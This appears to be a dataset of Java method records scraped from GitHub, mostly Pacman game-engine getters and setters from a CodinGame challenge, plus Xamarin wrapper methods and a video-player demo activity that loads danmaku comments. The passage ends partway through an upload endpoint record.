[{"method_name": "setPosition", "params": ["Coord"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPosition(Coord coord) {        this.position = coord;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPosition", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Coord", "snippet": "    public Coord getPosition() {        return position;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSpeed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getSpeed() {        return speed;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSpeed", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSpeed(int speed) {        this.speed = speed;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAbilityDuration", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getAbilityDuration() {        return abilityDuration;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAbilityDuration", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAbilityDuration(int abilityDuration) {        this.abilityDuration = abilityDuration;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "tickAbilityDuration", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void tickAbilityDuration() {        if (abilityDuration > 0) {            abilityDuration--;            endOfSpeed = abilityDuration == 0;        } else {            endOfSpeed = false;        }    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAbilityCooldown", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getAbilityCooldown() {        return abilityCooldown;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAbilityCooldown", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAbilityCooldown(int abilityCooldown) {        this.abilityCooldown = abilityCooldown;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "tickAbilityCooldown", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void tickAbilityCooldown() {        if (abilityCooldown > 0) {            abilityCooldown--;        }    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "turnReset", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void turnReset() {        message = null;        if (!isDead()) {            tickAbilityDuration();            tickAbilityCooldown();        }        setAbilityToUse(null);        setCurrentPathStep(0);        blocked = false;        this.intent = Action.NO_ACTION;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "gotBlocked", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean gotBlocked() {        return blocked;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setBlocked", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setBlocked(boolean blocked) {        this.blocked = blocked;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getId() {        return id;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getNumber", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getNumber() {        return number;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOwner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Player", "snippet": "    public Player getOwner() {        return owner;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMessage() {        return message;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getIntent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Action", "snippet": "    public Action getIntent() {        return intent;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setIntent", "params": ["Action"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIntent(Action intent) {        this.intent = intent;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAbilityToUse", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Ability", "snippet": "    public Ability.Type getAbilityToUse() {        return abilityToUse;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAbilityToUse", "params": ["Ability"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAbilityToUse(Ability.Type abilityToUse) {        this.abilityToUse = abilityToUse;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getIntendedPath", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Coord>", "snippet": "    public List<Coord> getIntendedPath() {        return intendedPath;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setIntendedPath", "params": ["List<Coord>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIntendedPath(List<Coord> intendedPath) {        this.intendedPath = intendedPath;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "clearIntendedPath", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clearIntendedPath() {        this.intendedPath.clear();    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isPathResolved", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isPathResolved() {        return pathResolved;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setPathResolved", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPathResolved(boolean pathResolved) {        this.pathResolved = pathResolved;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "PacmanType", "snippet": "    public PacmanType getType() {        return type;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setType", "params": ["PacmanType"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setType(PacmanType type) {        this.type = type;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCurrentPathStep", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCurrentPathStep(int step) {        setPreviousPathStep(currentPathStep);        currentPathStep = step;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "moveFinished", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean moveFinished() {        return getCurrentPathStep() == intendedPath.size() - 1;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurrentPathStep", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCurrentPathStep() {        return currentPathStep;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPreviousPathStep", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getPreviousPathStep() {        return previousPathStep;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setPreviousPathStep", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPreviousPathStep(int previousPathStep) {        this.previousPathStep = previousPathStep;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "fastEnoughToMoveAt", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean fastEnoughToMoveAt(int step) {        return speed > step;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isSpeeding", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isSpeeding() {        return speed == Config.SPEED_BOOST;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getWarningPathMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getWarningPathMessage() {        return warningPathMessage;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setWarningPathMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setWarningPathMessage(String warningPathMessage) {        this.warningPathMessage = warningPathMessage;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "clearGameSummary", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clearGameSummary() {        gameSummary = new ArrayList<>();    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getGameSummary", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> getGameSummary() {        return gameSummary;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "addToGameSummary", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addToGameSummary(String message) {        this.gameSummary.add(message);    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDead", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDead() {        this.dead = true;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isDead", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isDead() {        return dead;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isEndOfSpeed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isEndOfSpeed() {        return endOfSpeed;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/Pacman.java", "stars": "15", "class": {"name": "Pacman", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isRunning", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isRunning ()\t{\t\treturn n_isRunning ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FormsAnimationDrawable.java", "stars": "2", "class": {"name": "FormsAnimationDrawable", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_isRunning", "params": [], "throws": null, "modifiers": ["native", "private"], "return_type": "boolean", "snippet": "\tprivate native boolean n_isRunning ();\tpublic void start ()\t{\t\tn_start ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FormsAnimationDrawable.java", "stars": "2", "class": {"name": "FormsAnimationDrawable", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "start", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void start ()\t{\t\tn_start ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FormsAnimationDrawable.java", "stars": "2", "class": {"name": "FormsAnimationDrawable", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_start", "params": [], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_start ();\tpublic void stop ()\t{\t\tn_stop ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FormsAnimationDrawable.java", "stars": "2", "class": {"name": "FormsAnimationDrawable", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "stop", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void stop ()\t{\t\tn_stop ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FormsAnimationDrawable.java", "stars": "2", "class": {"name": "FormsAnimationDrawable", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_stop", "params": [], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_stop ();\tpublic boolean selectDrawable (int p0)\t{\t\treturn n_selectDrawable (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FormsAnimationDrawable.java", "stars": "2", "class": {"name": "FormsAnimationDrawable", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "selectDrawable", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean selectDrawable (int p0)\t{\t\treturn n_selectDrawable (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FormsAnimationDrawable.java", "stars": "2", "class": {"name": "FormsAnimationDrawable", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_selectDrawable", "params": ["int"], "throws": null, "modifiers": ["native", "private"], "return_type": "boolean", "snippet": "\tprivate native boolean n_selectDrawable (int p0);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FormsAnimationDrawable.java", "stars": "2", "class": {"name": "FormsAnimationDrawable", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FormsAnimationDrawable.java", "stars": "2", "class": {"name": "FormsAnimationDrawable", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FormsAnimationDrawable.java", "stars": "2", "class": {"name": "FormsAnimationDrawable", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_danmaku_layout);        ButterKnife.bind(this);        //\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684\u5168\u5c4f\u5207\u6362\u56fe\u7247\uff0c!!!\u6ce8\u610fxml\u5e03\u5c40\u4e2d\u4e5f\u9700\u8981\u8bbe\u7f6e\u4e3a\u4e00\u6837\u7684        //\u5fc5\u987b\u5728setUp\u4e4b\u524d\u8bbe\u7f6e        danmakuVideoPlayer.setShrinkImageRes(R.drawable.custom_shrink);        danmakuVideoPlayer.setEnlargeImageRes(R.drawable.custom_enlarge);        //String url = \"https://res.exexm.com/cw_145225549855002\";        String url = \"http://9890.vod.myqcloud.com/9890_4e292f9a3dd011e6b4078980237cc3d3.f20.mp4\";        //String url = \"https://res.exexm.com/cw_145225549855002\";        danmakuVideoPlayer.setUp(url, true, null, \"\u6d4b\u8bd5\u89c6\u9891\");        //\u589e\u52a0\u5c01\u9762        ImageView imageView = new ImageView(this);        imageView.setScaleType(ImageView.ScaleType.CENTER_CROP);        imageView.setImageResource(R.mipmap.xxx1);        danmakuVideoPlayer.setThumbImageView(imageView);        resolveNormalVideoUI();        //\u5916\u90e8\u8f85\u52a9\u7684\u65cb\u8f6c\uff0c\u5e2e\u52a9\u5168\u5c4f        orientationUtils = new OrientationUtils(this, danmakuVideoPlayer);        //\u521d\u59cb\u5316\u4e0d\u6253\u5f00\u5916\u90e8\u7684\u65cb\u8f6c        orientationUtils.setEnable(false);        danmakuVideoPlayer.setIsTouchWiget(true);        //\u5173\u95ed\u81ea\u52a8\u65cb\u8f6c        danmakuVideoPlayer.setRotateViewAuto(false);        danmakuVideoPlayer.setLockLand(false);        danmakuVideoPlayer.setShowFullAnimation(false);        danmakuVideoPlayer.setNeedLockFull(true);        //detailPlayer.setOpenPreView(true);        danmakuVideoPlayer.getFullscreenButton().setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View v) {                //\u76f4\u63a5\u6a2a\u5c4f                orientationUtils.resolveByClick();                //\u7b2c\u4e00\u4e2atrue\u662f\u5426\u9700\u8981\u9690\u85cfactionbar\uff0c\u7b2c\u4e8c\u4e2atrue\u662f\u5426\u9700\u8981\u9690\u85cfstatusbar                danmakuVideoPlayer.startWindowFullscreen(DanmkuVideoActivity.this, true, true);            }        });        danmakuVideoPlayer.setVideoAllCallBack(new GSYSampleCallBack() {            @Override            public void onPrepared(String url, Object... objects) {                super.onPrepared(url, objects);                //\u5f00\u59cb\u64ad\u653e\u4e86\u624d\u80fd\u65cb\u8f6c\u548c\u5168\u5c4f                orientationUtils.setEnable(true);                isPlay = true;                getDanmu();            }            @Override            public void onAutoComplete(String url, Object... objects) {                super.onAutoComplete(url, objects);            }            @Override            public void onClickStartError(String url, Object... objects) {                super.onClickStartError(url, objects);            }            @Override            public void onQuitFullscreen(String url, Object... objects) {                super.onQuitFullscreen(url, objects);                if (orientationUtils != null) {                    orientationUtils.backToProtVideo();                }            }        });        danmakuVideoPlayer.setLockClickListener(new LockClickListener() {            @Override            public void onClick(View view, boolean lock) {                if (orientationUtils != null) {                    //\u914d\u5408\u4e0b\u65b9\u7684onConfigurationChanged                    orientationUtils.setEnable(!lock);                }            }        });    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DanmkuVideoActivity.java", "stars": "2", "class": {"name": "DanmkuVideoActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onBackPressed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBackPressed() {        if (orientationUtils != null) {            orientationUtils.backToProtVideo();        }        if (GSYVideoManager.backFromWindowFull(this)) {            return;        }        super.onBackPressed();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DanmkuVideoActivity.java", "stars": "2", "class": {"name": "DanmkuVideoActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onPause", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onPause() {        getCurPlay().onVideoPause();        super.onPause();        isPause = true;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DanmkuVideoActivity.java", "stars": "2", "class": {"name": "DanmkuVideoActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onResume", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onResume() {        getCurPlay().onVideoResume();        super.onResume();        isPause = false;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DanmkuVideoActivity.java", "stars": "2", "class": {"name": "DanmkuVideoActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onDestroy", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDestroy() {        super.onDestroy();        if (isPlay) {            getCurPlay().release();        }        //GSYPreViewManager.instance().releaseMediaPlayer();        if (orientationUtils != null)            orientationUtils.releaseListener();        isDestory = true;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DanmkuVideoActivity.java", "stars": "2", "class": {"name": "DanmkuVideoActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onConfigurationChanged", "params": ["Configuration"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onConfigurationChanged(Configuration newConfig) {        super.onConfigurationChanged(newConfig);        //\u5982\u679c\u65cb\u8f6c\u4e86\u5c31\u5168\u5c4f        if (isPlay && !isPause) {            danmakuVideoPlayer.onConfigurationChanged(this, newConfig, orientationUtils, true, true);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DanmkuVideoActivity.java", "stars": "2", "class": {"name": "DanmkuVideoActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "getDanmu", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void getDanmu() {        //\u4e0b\u8f7ddemo\u7136\u540e\u8bbe\u7f6e        OkHttpUtils.get().url(TextUtils.concat(\"http://xingyuyou.com/Public/app/barragefile/\",\"608\",\"barrage.txt\").toString())                .build()                .execute(new FileCallBack(getApplication().getCacheDir().getAbsolutePath(), \"barrage.txt\")//                {                    @Override                    public void onError(Call call, Exception e, int id) {                    }                    @Override                    public void onResponse(File response, int id) {                        if (!isDestory) {                            ((DanmakuVideoPlayer) danmakuVideoPlayer.getCurrentPlayer()).setDanmaKuStream(response);                        }                    }                });    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DanmkuVideoActivity.java", "stars": "2", "class": {"name": "DanmkuVideoActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "resolveNormalVideoUI", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void resolveNormalVideoUI() {        //\u589e\u52a0title        danmakuVideoPlayer.getTitleTextView().setVisibility(View.GONE);        danmakuVideoPlayer.getBackButton().setVisibility(View.GONE);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DanmkuVideoActivity.java", "stars": "2", "class": {"name": "DanmkuVideoActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurPlay", "params": [], "throws": null, "modifiers": ["private"], "return_type": "GSYVideoPlayer", "snippet": "    private GSYVideoPlayer getCurPlay() {        if (danmakuVideoPlayer.getFullWindowPlayer() != null) {            return  danmakuVideoPlayer.getFullWindowPlayer();        }        return danmakuVideoPlayer;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DanmkuVideoActivity.java", "stars": "2", "class": {"name": "DanmkuVideoActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "upload", "params": ["MultipartFile", "Integer", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String upload(@RequestParam(\"file\") MultipartFile file,                         @PathVariable(\"userId\") Integer userId,                         @PathVariable(\"token\") String token) {        log.info(\"user: {} upload 